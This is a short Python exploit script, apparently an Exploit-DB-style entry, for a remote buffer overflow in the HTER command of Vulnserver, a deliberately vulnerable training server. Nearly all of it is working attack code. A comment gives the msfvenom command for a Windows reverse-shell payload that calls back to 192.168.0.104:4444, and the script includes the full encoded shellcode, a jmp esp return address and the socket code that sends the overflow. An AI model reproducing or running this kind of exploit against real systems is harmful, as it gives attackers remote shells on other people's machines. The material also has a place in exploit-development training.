# Exploit Title: Vuln Server  - Remote Buffer Overflow HTER command
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
# Software Link: http://sites.google.com/site/lupingreycorner/vulnserver.zip
# Version: NA
# Tested on: Windows XP SP2


#!/usr/bin/python

import socket
import os
import sys

host="192.168.0.102"
port=9999

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e x86/alpha_mixed BufferRegister=ESP -f hex
shellcode = "54594949494949494949494949494949494937515a6a415850304130416b41415132414232424230424241425850384142754a49596c4a486e6233305770355055304f7959756471495032444c4b663066504e6b7632666c4c4b427242346e6b70725648744f4837504a77565561696f4c6c474c7061634c7552346c67507a615a6f466d3771784738623962514256376c4b536252304c4b615a656c6e6b504c623164385a4367384661585170516c4b53694570633149434c4b637976786d33665a31594e6b36546e6b777139465471796f6e4c6f31684f566d4771784736584d3031655a567333516d7a58356b516d764430754d3452784c4b436861347661694370664c4b644c526b6c4b3638476c666178534c4b44444c4b755158506e69615457544574614b714b33515279536a7631496f7970514f336f705a6e6b42326a4b6c4d614d506877436652533067707248716763437742636f50545178326c443766463667496f4e356f486c5076616770733046496b7476347270653856496b30306b65504b4f4e35427030503050663073704630373036306248397a766f4b6f59704b4f6a756f67635a633551784f304e48555051785248644265504231736c6d596d36335a62305146727750686f69493552545531696f4e356d554f306344666c796f704e77786435586c43586a504c756e426146796f4e3552485533506d706435504b39786353673147627736514966706a6232663953664972496d7246484761543754774c677135516c4d6374464466706b76555057346144327070567366563661564366326e663630563053714661786169484c674f4d56496f69454c495970626e63663376596f4470735863384e67754d4530496f69456d6b587048354c627146717849364e756d6d6d4d496f4b65656c5336334c744a6f70596b5970716574454f4b515764537072524f535a55505053396f79454141"

#0x625011AF      jmp esp
buffer = "HTER 0" + "A" * 2040 + "AF115062" + shellcode
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(buffer)
expl.recv(1024)
expl.close()
